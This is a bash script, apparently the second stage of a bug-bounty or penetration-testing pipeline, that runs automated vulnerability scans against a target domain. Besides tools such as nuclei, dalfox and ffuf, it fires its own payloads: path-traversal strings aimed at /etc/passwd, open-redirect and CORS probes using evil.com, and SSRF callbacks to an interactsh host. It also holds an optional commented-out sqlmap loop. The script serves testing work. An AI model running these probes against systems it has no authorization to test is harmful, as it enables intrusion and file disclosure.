#!/bin/bash
# ============================================================
#  2_SCAN.SH — Automated Vulnerability Scanning
#  Usage: ./2_scan.sh <domain> [results_dir]
#  Runs after 1_recon.sh
# ============================================================

set -uo pipefail
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
section() { echo -e "\n${CYAN}${BOLD}━━━ $1 ━━━${NC}"; }
die()     { echo -e "${RED}[✗]${NC} $1" >&2; exit 1; }

[[ $# -lt 1 ]] && die "Usage: $0 <domain> [results_dir]"
DOMAIN="$1"
OUT="${2:-./results/$DOMAIN}"
VULNS="$OUT/vulns"
URLS="$OUT/endpoints/all_urls.txt"
LIVE="$OUT/hosts/live_urls.txt"
PARAMS="$OUT/endpoints/urls_with_params.txt"

mkdir -p "$VULNS"/{nuclei,xss,sqli,ssrf,lfi,open_redirect,cors,headers,fuzz}

[[ -f "$LIVE" ]] || die "Live hosts not found. Run 1_recon.sh first!"

echo -e "${BOLD}╔══════════════════════════════════════╗"
echo -e "║  Vulnerability Scan — $DOMAIN"
echo -e "╚══════════════════════════════════════╝${NC}"

# ══════════════════════════════════════
# NUCLEI — Template-based scanning
# ══════════════════════════════════════
section "Nuclei Scanning"

# Critical/High severity first
info "Running Nuclei (critical + high severity)..."
nuclei \
  -l "$LIVE" \
  -severity critical,high \
  -silent \
  -o "$VULNS/nuclei/critical_high.txt" \
  -json -o "$VULNS/nuclei/critical_high.json" \
  -retries 2 2>/dev/null || warn "Nuclei crit/high failed"

# Medium severity
info "Running Nuclei (medium severity)..."
nuclei \
  -l "$LIVE" \
  -severity medium \
  -silent \
  -o "$VULNS/nuclei/medium.txt" 2>/dev/null || warn "Nuclei medium failed"

# Specific categories
NUCLEI_TAGS=(
  "cve"
  "default-login"
  "exposed-panels"
  "misconfig"
  "exposure"
  "takeover"
  "token-spray"
)

for tag in "${NUCLEI_TAGS[@]}"; do
  info "Nuclei tag: $tag..."
  nuclei \
    -l "$LIVE" \
    -tags "$tag" \
    -silent \
    -o "$VULNS/nuclei/${tag}.txt" 2>/dev/null
done

NUCLEI_FINDINGS=$(cat "$VULNS/nuclei/"*.txt 2>/dev/null | wc -l)
info "Nuclei total findings: ${BOLD}$NUCLEI_FINDINGS${NC}"

# ══════════════════════════════════════
# XSS Detection
# ══════════════════════════════════════
section "XSS Detection"

if [[ -f "$PARAMS" ]]; then
  info "Running Dalfox for XSS..."
  dalfox file "$PARAMS" \
    --silence \
    --no-spinner \
    --format json \
    -o "$VULNS/xss/dalfox_results.json" 2>/dev/null || warn "dalfox failed"

  # GF pattern filtering for reflected params
  info "Filtering XSS-prone parameters with GF..."
  cat "$PARAMS" | gf xss 2>/dev/null \
    | sort -u > "$VULNS/xss/xss_candidates.txt" || warn "gf xss failed"

  # Kxss for quick reflected detection  
  if command -v kxss &>/dev/null; then
    cat "$VULNS/xss/xss_candidates.txt" \
      | kxss 2>/dev/null > "$VULNS/xss/kxss_results.txt" || warn "kxss failed"
  fi
else
  warn "No parameterized URLs found, skipping XSS"
fi

# ══════════════════════════════════════
# SQL Injection
# ══════════════════════════════════════
section "SQL Injection Detection"

if [[ -f "$PARAMS" ]]; then
  info "Filtering SQLi candidates with GF..."
  cat "$PARAMS" | gf sqli 2>/dev/null \
    | sort -u > "$VULNS/sqli/sqli_candidates.txt" || warn "gf sqli failed"

  SQLI_COUNT=$(wc -l < "$VULNS/sqli/sqli_candidates.txt" 2>/dev/null || echo 0)
  info "SQLi candidates: $SQLI_COUNT"

  # Use sqlmap if available (careful with rate limits!)
  if command -v sqlmap &>/dev/null && [[ "$SQLI_COUNT" -gt 0 ]]; then
    warn "SQLi candidates found — review manually or use sqlmap carefully"
    info "Candidates saved to: $VULNS/sqli/sqli_candidates.txt"
    # Uncomment to auto-run sqlmap (use only on authorized targets):
    # head -20 "$VULNS/sqli/sqli_candidates.txt" | while read url; do
    #   sqlmap -u "$url" --batch --level=2 --risk=2 2>/dev/null
    # done
  fi
fi

# ══════════════════════════════════════
# SSRF Detection
# ══════════════════════════════════════
section "SSRF Detection"

if [[ -f "$PARAMS" ]]; then
  info "Filtering SSRF candidates with GF..."
  cat "$PARAMS" | gf ssrf 2>/dev/null \
    | sort -u > "$VULNS/ssrf/ssrf_candidates.txt" || warn "gf ssrf failed"

  SSRF_COUNT=$(wc -l < "$VULNS/ssrf/ssrf_candidates.txt" 2>/dev/null || echo 0)
  info "SSRF candidates: $SSRF_COUNT"
  
  # Replace param values with Burp Collaborator / interactsh
  if command -v interactsh-client &>/dev/null; then
    INTERACT_HOST=$(interactsh-client -json 2>/dev/null | jq -r '.url' | head -1)
    if [[ -n "$INTERACT_HOST" ]]; then
      info "Injecting interactsh payload: $INTERACT_HOST"
      cat "$VULNS/ssrf/ssrf_candidates.txt" \
        | qsreplace "https://$INTERACT_HOST" 2>/dev/null \
        | while read url; do
            curl -sk "$url" -o /dev/null &
          done
      wait
      info "SSRF payloads sent — check interactsh dashboard"
    fi
  fi
fi

# ══════════════════════════════════════
# Open Redirect
# ══════════════════════════════════════
section "Open Redirect Detection"

if [[ -f "$PARAMS" ]]; then
  info "Filtering open redirect candidates..."
  cat "$PARAMS" | gf redirect 2>/dev/null \
    | sort -u > "$VULNS/open_redirect/candidates.txt" || warn "gf redirect failed"

  info "Testing open redirects..."
  PAYLOADS=(
    "https://evil.com"
    "//evil.com"
    "javascript:alert(1)"
    "https://evil.com%2F@legitimate.com"
  )
  
  while read url; do
    for payload in "${PAYLOADS[@]}"; do
      result=$(curl -sk -o /dev/null -w "%{redirect_url}" \
        "$(echo "$url" | qsreplace "$payload")" 2>/dev/null)
      if echo "$result" | grep -qi "evil.com"; then
        echo "[OPEN REDIRECT] $url → $result" | tee -a "$VULNS/open_redirect/confirmed.txt"
      fi
    done
  done < "$VULNS/open_redirect/candidates.txt"
fi

# ══════════════════════════════════════
# LFI Detection
# ══════════════════════════════════════
section "LFI / Path Traversal"

if [[ -f "$PARAMS" ]]; then
  info "Filtering LFI candidates..."
  cat "$PARAMS" | gf lfi 2>/dev/null \
    | sort -u > "$VULNS/lfi/candidates.txt" || warn "gf lfi failed"

  LFI_PAYLOADS=(
    "../../../../etc/passwd"
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    "/etc/passwd"
    "....//....//etc/passwd"
    "%2F%2F%2F%2F..%2F..%2Fetc/passwd"
  )

  while read url; do
    for payload in "${LFI_PAYLOADS[@]}"; do
      result=$(curl -sk "$(echo "$url" | qsreplace "$payload")" 2>/dev/null)
      if echo "$result" | grep -q "root:"; then
        echo "[LFI CONFIRMED] $url payload=$payload" | tee -a "$VULNS/lfi/confirmed.txt"
      fi
    done
  done < "$VULNS/lfi/candidates.txt"
fi

# ══════════════════════════════════════
# CORS Misconfiguration
# ══════════════════════════════════════
section "CORS Misconfiguration"

info "Checking CORS on live hosts..."
while read url; do
  # Test with evil origin
  result=$(curl -sk -H "Origin: https://evil.com" \
    -o /dev/null -D - "$url" 2>/dev/null \
    | grep -i "access-control-allow-origin")
  
  if echo "$result" | grep -qi "evil.com"; then
    echo "[CORS] Allow-All Origin: $url" | tee -a "$VULNS/cors/vulnerable.txt"
  elif echo "$result" | grep -qi "null"; then
    echo "[CORS] Null Origin Allowed: $url" | tee -a "$VULNS/cors/null_origin.txt"
  fi
done < "$LIVE"

# ══════════════════════════════════════
# Security Headers Check
# ══════════════════════════════════════
section "Security Headers Analysis"

info "Checking security headers..."
MISSING_HEADERS=(
  "x-frame-options"
  "content-security-policy"
  "x-content-type-options"
  "strict-transport-security"
  "permissions-policy"
)

while read url; do
  headers=$(curl -sk -I "$url" 2>/dev/null | tr '[:upper:]' '[:lower:]')
  missing=""
  for hdr in "${MISSING_HEADERS[@]}"; do
    echo "$headers" | grep -qi "$hdr" || missing="$missing $hdr"
  done
  [[ -n "$missing" ]] && echo "$url | MISSING:$missing" >> "$VULNS/headers/missing_headers.txt"
done < "$LIVE"

# ══════════════════════════════════════
# Directory Fuzzing
# ══════════════════════════════════════
section "Directory Fuzzing"

info "Fuzzing for sensitive paths on top live hosts..."
# Only fuzz the first 10 to avoid hammering
head -10 "$LIVE" | while read url; do
  host=$(echo "$url" | sed 's|/.*||')
  ffuf \
    -u "${url}/FUZZ" \
    -w ~/wordlists/common.txt \
    -mc 200,201,204,301,302,403 \
    -t 50 \
    -silent \
    -o "$VULNS/fuzz/$(echo "$host" | tr '/:' '_').json" \
    -of json 2>/dev/null || warn "ffuf failed for $url"
done

# ══════════════════════════════════════
# FINAL SUMMARY
# ══════════════════════════════════════
section "SCAN SUMMARY"

echo ""
echo "═══════════════════════════════════"
echo "  FINDINGS SUMMARY — $DOMAIN"
echo "═══════════════════════════════════"
echo "Nuclei findings     : $(cat "$VULNS/nuclei/"*.txt 2>/dev/null | wc -l)"
echo "XSS candidates      : $(wc -l < "$VULNS/xss/xss_candidates.txt" 2>/dev/null || echo 0)"
echo "SQLi candidates     : $(wc -l < "$VULNS/sqli/sqli_candidates.txt" 2>/dev/null || echo 0)"
echo "SSRF candidates     : $(wc -l < "$VULNS/ssrf/ssrf_candidates.txt" 2>/dev/null || echo 0)"
echo "Open redirects conf : $(wc -l < "$VULNS/open_redirect/confirmed.txt" 2>/dev/null || echo 0)"
echo "LFI confirmed       : $(wc -l < "$VULNS/lfi/confirmed.txt" 2>/dev/null || echo 0)"
echo "CORS issues         : $(wc -l < "$VULNS/cors/vulnerable.txt" 2>/dev/null || echo 0)"
echo "═══════════════════════════════════"
echo ""
info "Next: run 3_js_analyzer.py for secrets in JS files"
